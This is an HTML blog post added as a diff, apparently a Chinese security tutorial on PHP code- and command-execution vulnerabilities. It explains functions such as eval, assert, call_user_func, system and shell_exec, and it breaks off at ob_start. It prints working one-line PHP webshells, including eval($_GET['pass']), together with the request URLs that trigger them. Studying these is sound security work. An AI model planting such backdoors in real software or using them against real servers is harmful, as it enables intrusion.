@@ -1,0 +1,1352 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="0x01 php相关函数一、代码执行eval()1mixed eval ( string $code )  把字符串code作为php代码执行。常见的一句话木马： 123&amp;lt;?php	eval($_GET[&apos;pass&apos;])?&amp;gt;  访问： 1http://xxx/codeexec.php?pass=phpinfo();  得到phpinfo()页面。 assert()PHP 5 1bool">
+<meta name="keywords" content="命令执行">
+<meta property="og:type" content="article">
+<meta property="og:title" content="命令执行漏洞进阶详解">
+<meta property="og:url" content="https://wh0ale.github.io/2019/01/13/2019-1-13-命令执行/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="0x01 php相关函数一、代码执行eval()1mixed eval ( string $code )  把字符串code作为php代码执行。常见的一句话木马： 123&amp;lt;?php	eval($_GET[&apos;pass&apos;])?&amp;gt;  访问： 1http://xxx/codeexec.php?pass=phpinfo();  得到phpinfo()页面。 assert()PHP 5 1bool">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://image.3001.net/images/20180921/1537502835_5ba46e73d257c.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180921/1537502841_5ba46e7975cd2.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180921/1537502846_5ba46e7e6b184.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180921/1537502851_5ba46e8347baa.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180921/1537502856_5ba46e88a070e.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180921/1537502861_5ba46e8d4ba6b.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180921/1537502866_5ba46e92406de.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180921/1537502872_5ba46e98ecccb.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180921/1537502879_5ba46e9f57574.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180921/1537502886_5ba46ea63da4c.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180921/1537502890_5ba46eaae5868.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180921/1537502895_5ba46eaf5c2cf.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180921/1537502900_5ba46eb46ac57.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180921/1537502905_5ba46eb9427e5.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181110/1541820877_5be651cd47f6f.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181110/1541820884_5be651d4f16c8.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181110/1541820889_5be651d9b9089.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181110/1541820893_5be651dd2ef0e.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181110/1541820898_5be651e23b6c0.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181110/1541820902_5be651e609637.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181110/1541820907_5be651eb2e109.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181110/1541820915_5be651f3694bf.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181110/1541820919_5be651f7cccaa.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181110/1541820924_5be651fcae8f6.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181110/1541820929_5be652013957a.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181110/1541820936_5be65208ce705.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181110/1541820943_5be6520f69d1c.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181110/1541820955_5be6521b1eaec.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181110/1541820962_5be6522246cf0.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181110/1541820968_5be65228e6fe6.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181110/1541820978_5be652327a4ec.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181110/1541820983_5be65237b6e8c.png!small">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3xm8xv7gj20og05iaap.jpg">
+<meta property="og:image" content="https://image.3001.net/images/20181110/1541820989_5be6523df3c31.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181110/1541820995_5be6524339c9e.png!small">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3ytbsxg4j2152024dg2.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3yxyycr6j20k50aa3zr.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3z13cwe3j20xk095t9e.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3z6hgejbj20a602yjra.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3zeu3wyyj20sb0f4ad4.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3zfop9nbj20u9061jtn.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3zhfisppj20z9046di4.jpg">
+<meta property="og:updated_time" content="2019-09-06T06:03:19.392Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="命令执行漏洞进阶详解">
+<meta name="twitter:description" content="0x01 php相关函数一、代码执行eval()1mixed eval ( string $code )  把字符串code作为php代码执行。常见的一句话木马： 123&amp;lt;?php	eval($_GET[&apos;pass&apos;])?&amp;gt;  访问： 1http://xxx/codeexec.php?pass=phpinfo();  得到phpinfo()页面。 assert()PHP 5 1bool">
+<meta name="twitter:image" content="https://image.3001.net/images/20180921/1537502835_5ba46e73d257c.png!small">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2019/01/13/2019-1-13-命令执行/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>命令执行漏洞进阶详解 | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2019/01/13/2019-1-13-命令执行/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">命令执行漏洞进阶详解
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-01-13 00:00:00" itemprop="dateCreated datePublished" datetime="2019-01-13T00:00:00+08:00">2019-01-13</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-06 14:03:19" itemprop="dateModified" datetime="2019-09-06T14:03:19+08:00">2019-09-06</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">20k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">18 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <h1 id="0x01-php相关函数"><a href="#0x01-php相关函数" class="headerlink" title="0x01 php相关函数"></a>0x01 php相关函数</h1><h2 id="一、代码执行"><a href="#一、代码执行" class="headerlink" title="一、代码执行"></a>一、代码执行</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed <span class="keyword">eval</span> ( string $code )</span><br></pre></td></tr></table></figure>
+
+<p>把字符串<code>code</code>作为php代码执行。常见的一句话木马：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">eval</span>($_GET[<span class="string">'pass'</span>])</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//xxx/codeexec.php?pass=phpinfo();</span></span><br></pre></td></tr></table></figure>
+
+<p>得到phpinfo()页面。</p>
+<h3 id="assert"><a href="#assert" class="headerlink" title="assert()"></a><strong>assert()</strong></h3><p>PHP 5</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool assert ( mixed $assertion [, string $description ] )</span><br></pre></td></tr></table></figure>
+
+<p>PHP 7</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool assert ( mixed $assertion [, Throwable $exception ] )</span><br></pre></td></tr></table></figure>
+
+<p>assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的响应。如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</p>
+<p>一句话木马：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	assert($_GET[<span class="string">'pass'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//xxx/codeexec.php?pass=phpinfo()</span></span><br></pre></td></tr></table></figure>
+
+<p>phpinfo()后可以不用分号。得到phpinfo()页面。</p>
+<h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a><strong>preg_replace</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = <span class="number">-1</span> [, int &amp;$count ]] )</span><br></pre></td></tr></table></figure>
+
+<p>搜索subject中匹配pattern的部分， 以replacement进行替换。当使用被弃用的 e 修饰符时, 这个函数会转义一些字符，在完成替换后，引擎会将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串<br>更详细的说明见：<a href="http://php.net/preg_replace" target="_blank" rel="noopener">php-preg_replace</a></p>
+<h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a><strong>call_user_func()</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] )</span><br></pre></td></tr></table></figure>
+
+<p>第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。 传入call_user_func()的参数不能为引用传递。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	call_user_func($_GET[<span class="string">'chybeta'</span>],$_GET[<span class="string">'ph0en1x'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:2500/codeexec.php?chybeta=assert&amp;ph0en1x=phpinfo()</span><br></pre></td></tr></table></figure>
+
+<h3 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a><strong>call_user_func_array()</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed call_user_func_array ( callable $callback , <span class="keyword">array</span> $param_arr )</span><br></pre></td></tr></table></figure>
+
+<p>把第一个参数作为<strong>回调函数（callback）</strong>调用，把参数数组作（param_arr）为回调函数的的参数传入。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	call_user_func_array($_GET[<span class="string">'chybeta'</span>],$_GET[<span class="string">'ph0en1x'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:2500/codeexec.php?chybeta=assert&amp;ph0en1x[]=phpinfo()</span><br></pre></td></tr></table></figure>
+
+<h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string create_function ( string $args , string $code )</span><br></pre></td></tr></table></figure>
+
+<p>该函数的内部实现用到了<code>eval</code>，所以也具有相同的安全问题。第一个参数<code>args</code>是后面定义函数的参数，第二个参数是函数的代码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$a = $_GET[<span class="string">'chybeta'</span>];</span><br><span class="line">	$b = create_function(<span class="string">'$a'</span>,<span class="string">"echo $a"</span>);</span><br><span class="line">	$b(<span class="string">''</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:2500/codeexec.php</span><br><span class="line">?chybeta=phpinfo();</span><br></pre></td></tr></table></figure>
+
+<h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span> array_map ( callable $callback , <span class="keyword">array</span> $array1 [, <span class="keyword">array</span> $... ] )</span><br></pre></td></tr></table></figure>
+
+<p>作用是为数组的每个元素应用回调函数 。其返回值为数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$array = <span class="keyword">array</span>(<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line">	array_map($_GET[<span class="string">'chybeta'</span>],$array);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost:2500/codeexec.php</span></span><br><span class="line">?chybeta=phpinfo</span><br></pre></td></tr></table></figure>
+
+<p>注意没有括号<code>()</code>和分号<code>;</code>。</p>
+<h2 id="二、系统命令执行"><a href="#二、系统命令执行" class="headerlink" title="二、系统命令执行"></a>二、系统命令执行</h2><h3 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string system ( string $command [, int &amp;$return_var ] )</span><br></pre></td></tr></table></figure>
+
+<p>command是要执行的命令。return_var，如果提供 return_var 参数， 则外部命令执行后的返回状态将会被设置到此变量中。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	system(<span class="string">"whoami"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>会看到运行了shell命令，并打印回显到页面上。</p>
+<h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void passthru ( string $command [, int &amp;$return_var ] )</span><br></pre></td></tr></table></figure>
+
+<p>command是要执行的命令。return_var，如果提供 return_var 参数， Unix <strong>命令的返回状态会被记录到此参数</strong>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	passthru(<span class="string">"whoami"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string exec ( string $command [, <span class="keyword">array</span> &amp;$output [, int &amp;$return_var ]] )</span><br></pre></td></tr></table></figure>
+
+<p>exec() 执行 command 参数所指定的命令。 其余参数，见<a href="http://php.net/manual/zh/function.exec.php" target="_blank" rel="noopener">文档</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> exec(<span class="string">"whoami"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec()"></a>pcntl_exec()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void pcntl_exec ( string $path [, <span class="keyword">array</span> $args [, <span class="keyword">array</span> $envs ]] )</span><br></pre></td></tr></table></figure>
+
+<p>path是可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本<br>args是一个要传递给程序的参数的字符串数组。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	pcntl_exec ( <span class="string">"/bin/bash"</span> , <span class="keyword">array</span>(<span class="string">"whoami"</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string shell_exec ( string $cmd )</span><br></pre></td></tr></table></figure>
+
+<p>cmd是要执行的命令。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> shell_exec(<span class="string">"whoami"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resource popen ( string $command , string $mode )</span><br></pre></td></tr></table></figure>
+
+<p>打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。 后面的mode，当为 ‘r’，返回的文件指针等于命令的 STDOUT，当为 ‘w’，返回的文件指针等于命令的 STDIN。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$handle = popen(<span class="string">"/bin/ls"</span>, <span class="string">"r"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a>proc_open()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resource proc_open ( string $cmd , <span class="keyword">array</span> $descriptorspec , <span class="keyword">array</span> &amp;$pipes [, string $cwd [, <span class="keyword">array</span> $env [, <span class="keyword">array</span> $other_options ]]] )</span><br></pre></td></tr></table></figure>
+
+<p>cmd是要执行的命令，其余见<a href="http://php.net/manual/zh/function.proc-open.php" target="_blank" rel="noopener">文档</a></p>
+<h3 id="反单引号"><a href="#反单引号" class="headerlink" title="`(反单引号)"></a>`(反单引号)</h3><p>在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出，使用反引号运算符“`”的效果与函数 shell_exec() 相同。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> `whoami`;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="ob-start"><a href="#ob-start" class="headerlink" title="ob_start()"></a>ob_start()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool ob_start ([ callback $output_callback [, int $chunk_size [, bool $erase ]]] )</span><br></pre></td></tr></table></figure>
+
+<p>此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。想要<strong>输出存储在内部缓冲区中的内容</strong>，可以使用 ob_end_flush() 函数。</p>
+<p>可选参数 output_callback 函数可以被指定。 此函数把一个字符串当作参数并返回一个字符串。 当输出缓冲区被( ob_flush(), ob_clean() 或者相似的函数)冲刷（送出）或者被清洗的时候；或者在请求结束之际输出缓冲区内容被冲刷到浏览器的时候该函数将会被调用。 当调用 output_callback 时，它将收到输出缓冲区的内容作为参数 并预期返回一个新的输出缓冲区作为结果，这个新返回的输出缓冲区内容将被送到浏览器。</p>
